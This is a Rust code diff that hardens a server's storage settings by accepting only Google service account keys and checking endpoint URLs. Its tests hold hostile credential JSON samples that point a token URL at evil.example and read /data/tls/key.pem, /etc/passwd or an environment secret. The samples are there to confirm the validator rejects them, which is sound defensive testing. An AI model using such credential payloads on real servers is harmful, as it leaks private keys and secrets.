@@ -403,6 +403,55 @@ fn check_s3_credentials(dest: &Destination) -> anyhow::Result<()> {
     }
 }
 
+/// Fields of a Google service account key file. Anything else means another kind of credential.
+const GCS_SERVICE_ACCOUNT_FIELDS: &[&str] = &[
+    "type",
+    "project_id",
+    "private_key_id",
+    "private_key",
+    "client_email",
+    "client_id",
+    "auth_uri",
+    "token_uri",
+    "auth_provider_x509_cert_url",
+    "client_x509_cert_url",
+    "universe_domain",
+];
+
+/// GCS accepts every kind of Google credential file, and some of them make the server act on its
+/// own behalf: an `external_account` reads a file or URL of the attacker's choosing (with
+/// `${VAR}`s from the server's environment) and posts it to a token URL they pick. Only service
+/// account keys, which sign with their own key against Google's fixed token endpoint, are allowed.
+fn check_gcs_credentials(dest: &Destination) -> anyhow::Result<()> {
+    use base64::Engine;
+    for (k, v) in &dest.options {
+        let key = k.to_ascii_lowercase();
+        if !matches!(
+            key.as_str(),
+            "credential" | "google_service_account_key" | "service_account_key"
+        ) {
+            continue;
+        }
+        let json = base64::engine::general_purpose::STANDARD
+            .decode(v.trim())
+            .ok()
+            .and_then(|b| serde_json::from_slice::<serde_json::Value>(&b).ok());
+        let Some(serde_json::Value::Object(fields)) = json else {
+            bail!("option '{k}' must be a base64-encoded service account key (JSON)");
+        };
+        if fields.get("type").and_then(|t| t.as_str()) != Some("service_account") {
+            bail!("option '{k}' must be a service account key (\"type\": \"service_account\")");
+        }
+        if let Some(f) = fields
+            .keys()
+            .find(|f| !GCS_SERVICE_ACCOUNT_FIELDS.contains(&f.as_str()))
+        {
+            bail!("option '{k}' has a field a service account key doesn't have: '{f}'");
+        }
+    }
+    Ok(())
+}
+
 /// Rejects destination settings that could reach outside their storage area: `..` in the prefix or
 /// any `*root` option, and options that make the server read one of its own files
 /// (`credential_path`, `config_file`, …).
@@ -421,6 +470,7 @@ pub fn validate_destination(dest: &Destination) -> anyhow::Result<()> {
     match scheme {
         Scheme::Azblob => check_azure_credentials(dest)?,
         Scheme::S3 => check_s3_credentials(dest)?,
+        Scheme::Gcs => check_gcs_credentials(dest)?,
         _ => {}
     }
     for (k, v) in &dest.options {
@@ -491,6 +541,12 @@ pub fn raw_operator(scheme: &str, options: &BTreeMap<String, String>) -> anyhow:
 }
 
 fn operator(scheme: Scheme, opts: HashMap<String, String>) -> anyhow::Result<Operator> {
+    // Checked on every open, not only when saved: the block may have been turned on since.
+    for (k, v) in &opts {
+        if k.contains("endpoint") && !v.trim().is_empty() {
+            crate::netguard::check_url_literal(&format!("option '{k}'"), v)?;
+        }
+    }
     // Own HTTP client per operator: OpenDAL's global client is bound to the first tokio runtime
     // that used it. It doesn't follow redirects and checks the addresses it connects to.
     let http = crate::netguard::storage_http_client()
@@ -1345,6 +1401,49 @@ mod tests {
         }
     }
 
+    /// Credential files that make the server read its own files or fetch URLs are refused.
+    #[test]
+    fn gcs_accepts_only_service_account_keys() {
+        use base64::Engine;
+        let gcs = |key: &str, json: &str| Destination {
+            scheme: "gcs".into(),
+            options: [
+                ("bucket".to_string(), "b".to_string()),
+                (
+                    key.to_string(),
+                    base64::engine::general_purpose::STANDARD.encode(json),
+                ),
+            ]
+            .into_iter()
+            .collect(),
+            ..dest(false)
+        };
+        let sa = r#"{"type":"service_account","project_id":"p","private_key":"k","client_email":"a@p.iam.gserviceaccount.com","token_uri":"https://oauth2.googleapis.com/token"}"#;
+        assert!(validate_destination(&gcs("credential", sa)).is_ok());
+        for json in [
+            r#"{"type":"external_account","audience":"${MALO_SIDECAR_SECRET}","subject_token_type":"x","token_url":"https://evil.example/t","credential_source":{"file":"/data/tls/key.pem"}}"#,
+            r#"{"type":"impersonated_service_account","service_account_impersonation_url":"https://evil.example","source_credentials":{}}"#,
+            r#"{"type":"authorized_user","client_id":"a","client_secret":"b","refresh_token":"c"}"#,
+            r#"{"type":"service_account","private_key":"k","client_email":"a","credential_source":{"file":"/etc/passwd"}}"#,
+            r#"["service_account"]"#,
+            "not json",
+        ] {
+            for key in [
+                "credential",
+                "Service_Account_Key",
+                "google_service_account_key",
+            ] {
+                assert!(
+                    validate_destination(&gcs(key, json)).is_err(),
+                    "{key}={json} accepted"
+                );
+            }
+        }
+        let mut d = gcs("credential", sa);
+        d.options.insert("credential".into(), "%%%".into());
+        assert!(validate_destination(&d).is_err());
+    }
+
     #[test]
     fn destination_validation() {
         let mut d = s3_dest();
@@ -1393,7 +1492,7 @@ mod tests {
                 "s3",
                 &[("aws_access_key_id", "a"), ("aws_secret_access_key", "s")],
             ),
-            with("gcs", &[("bucket", "b"), ("credential", "e30=")]),
+            with("gcs", &[("bucket", "b"), ("credential", "eyJ0eXBlIjoic2VydmljZV9hY2NvdW50IiwicHJpdmF0ZV9rZXkiOiJrIiwiY2xpZW50X2VtYWlsIjoiYUBiIn0=")]),
             with("azblob", &[("container", "c"), ("sas_token", "sv=1")]),
             with("azblob", &[("account_name", "n"), ("account_key", "a2V5")]),
             with(
